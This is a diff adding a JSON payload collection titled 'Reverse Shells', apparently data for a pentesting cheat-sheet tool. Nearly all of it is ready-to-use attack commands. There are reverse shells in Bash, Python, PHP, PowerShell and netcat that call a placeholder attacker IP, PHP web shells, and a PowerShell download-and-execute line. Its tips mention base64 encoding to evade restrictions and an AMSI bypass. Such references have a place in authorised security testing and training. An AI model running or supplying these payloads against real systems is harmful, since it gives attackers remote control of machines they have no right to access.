@@ -1,0 +1,222 @@
+{
+    "name": "Reverse Shells",
+    "category": "shells",
+    "description": "Various reverse shell payloads for different languages and systems",
+    "icon": "🐚",
+    "techniques": [
+        {
+            "id": "shell-1",
+            "name": "Bash Reverse Shell",
+            "difficulty": "Beginner",
+            "description": "Classic bash reverse shell one-liners",
+            "steps": [
+                "Start listener on attacker",
+                "Execute payload on target",
+                "Receive shell connection"
+            ],
+            "commands": [
+                {
+                    "tool": "Listener",
+                    "command": "nc -lvnp 4444",
+                    "description": "Start netcat listener"
+                },
+                {
+                    "tool": "Bash TCP",
+                    "command": "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1",
+                    "description": "Bash TCP reverse shell"
+                },
+                {
+                    "tool": "Bash UDP",
+                    "command": "bash -i >& /dev/udp/<attacker_ip>/4444 0>&1",
+                    "description": "Bash UDP reverse shell"
+                },
+                {
+                    "tool": "Bash with sh",
+                    "command": "/bin/sh -i >& /dev/tcp/<attacker_ip>/4444 0>&1",
+                    "description": "Using sh instead of bash"
+                }
+            ],
+            "tips": [
+                "May need to URL encode for web exploitation",
+                "Some systems don't support /dev/tcp"
+            ]
+        },
+        {
+            "id": "shell-2",
+            "name": "Python Reverse Shell",
+            "difficulty": "Beginner",
+            "description": "Python-based reverse shells",
+            "steps": [
+                "Start listener",
+                "Execute Python payload",
+                "Upgrade shell if needed"
+            ],
+            "commands": [
+                {
+                    "tool": "Python 3",
+                    "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+                    "description": "Python 3 reverse shell"
+                },
+                {
+                    "tool": "Python 2",
+                    "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+                    "description": "Python 2 reverse shell"
+                },
+                {
+                    "tool": "Windows Python",
+                    "command": "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"<IP>\",4444));subprocess.call([\"cmd\"],stdin=s,stdout=s,stderr=s)'",
+                    "description": "Windows Python shell"
+                }
+            ],
+            "tips": [
+                "Works on most Linux systems with Python",
+                "Can use exec() for tighter one-liner"
+            ]
+        },
+        {
+            "id": "shell-3",
+            "name": "PHP Reverse Shell",
+            "difficulty": "Beginner",
+            "description": "PHP reverse and web shells",
+            "steps": [
+                "Upload PHP file or inject code",
+                "Access the PHP file",
+                "Receive shell"
+            ],
+            "commands": [
+                {
+                    "tool": "PHP Exec",
+                    "command": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'\"); ?>",
+                    "description": "PHP exec reverse shell"
+                },
+                {
+                    "tool": "PHP System",
+                    "command": "<?php system($_GET['cmd']); ?>",
+                    "description": "Simple PHP web shell"
+                },
+                {
+                    "tool": "PHP Passthru",
+                    "command": "<?php passthru($_GET['cmd']); ?>",
+                    "description": "Alternative web shell"
+                },
+                {
+                    "tool": "PHP Socket",
+                    "command": "<?php $s=fsockopen(\"<IP>\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>",
+                    "description": "PHP socket shell"
+                }
+            ],
+            "tips": [
+                "PentestMonkey PHP reverse shell is excellent",
+                "Check disabled_functions in php.ini"
+            ]
+        },
+        {
+            "id": "shell-4",
+            "name": "PowerShell Reverse Shell",
+            "difficulty": "Intermediate",
+            "description": "PowerShell reverse shells for Windows",
+            "steps": [
+                "Start listener on attacker",
+                "Execute PowerShell payload on Windows target"
+            ],
+            "commands": [
+                {
+                    "tool": "PowerShell TCP",
+                    "command": "$client = New-Object System.Net.Sockets.TCPClient('<IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+                    "description": "Full PowerShell reverse shell"
+                },
+                {
+                    "tool": "Encoded PS",
+                    "command": "powershell -enc <base64_payload>",
+                    "description": "Base64 encoded PowerShell"
+                },
+                {
+                    "tool": "Invoke-PowerShellTcp",
+                    "command": "IEX(New-Object Net.WebClient).downloadString('http://<IP>/shell.ps1')",
+                    "description": "Download and execute"
+                }
+            ],
+            "tips": [
+                "Base64 encode to bypass restrictions",
+                "Use Nishang or PowerSploit frameworks",
+                "AMSI bypass may be needed"
+            ]
+        },
+        {
+            "id": "shell-5",
+            "name": "Netcat Reverse Shell",
+            "difficulty": "Beginner",
+            "description": "Netcat-based shells",
+            "steps": [
+                "Check if netcat is available",
+                "Determine netcat version",
+                "Execute appropriate payload"
+            ],
+            "commands": [
+                {
+                    "tool": "NC Traditional",
+                    "command": "nc -e /bin/bash <IP> 4444",
+                    "description": "Netcat with -e flag"
+                },
+                {
+                    "tool": "NC OpenBSD",
+                    "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f",
+                    "description": "Netcat without -e"
+                },
+                {
+                    "tool": "NC Windows",
+                    "command": "nc.exe -e cmd.exe <IP> 4444",
+                    "description": "Windows netcat shell"
+                },
+                {
+                    "tool": "Ncat SSL",
+                    "command": "ncat --ssl <IP> 4444 -e /bin/bash",
+                    "description": "Encrypted ncat connection"
+                }
+            ],
+            "tips": [
+                "-e flag not available in all versions",
+                "OpenBSD netcat uses mkfifo method",
+                "Ncat supports SSL encryption"
+            ]
+        },
+        {
+            "id": "shell-6",
+            "name": "Upgrade to PTY Shell",
+            "difficulty": "Intermediate",
+            "description": "Upgrade basic shell to fully interactive TTY",
+            "steps": [
+                "Get initial reverse shell",
+                "Spawn PTY",
+                "Configure terminal settings"
+            ],
+            "commands": [
+                {
+                    "tool": "Python PTY",
+                    "command": "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
+                    "description": "Spawn Python PTY"
+                },
+                {
+                    "tool": "script PTY",
+                    "command": "script -qc /bin/bash /dev/null",
+                    "description": "PTY via script command"
+                },
+                {
+                    "tool": "Background & stty",
+                    "command": "Ctrl+Z, stty raw -echo; fg",
+                    "description": "Full TTY upgrade"
+                },
+                {
+                    "tool": "Export TERM",
+                    "command": "export TERM=xterm-256color",
+                    "description": "Set terminal type"
+                }
+            ],
+            "tips": [
+                "Full PTY allows tab completion, clear screen",
+                "Required for tools like vim, sudo",
+                "Reset terminal if it breaks"
+            ]
+        }
+    ]
+}
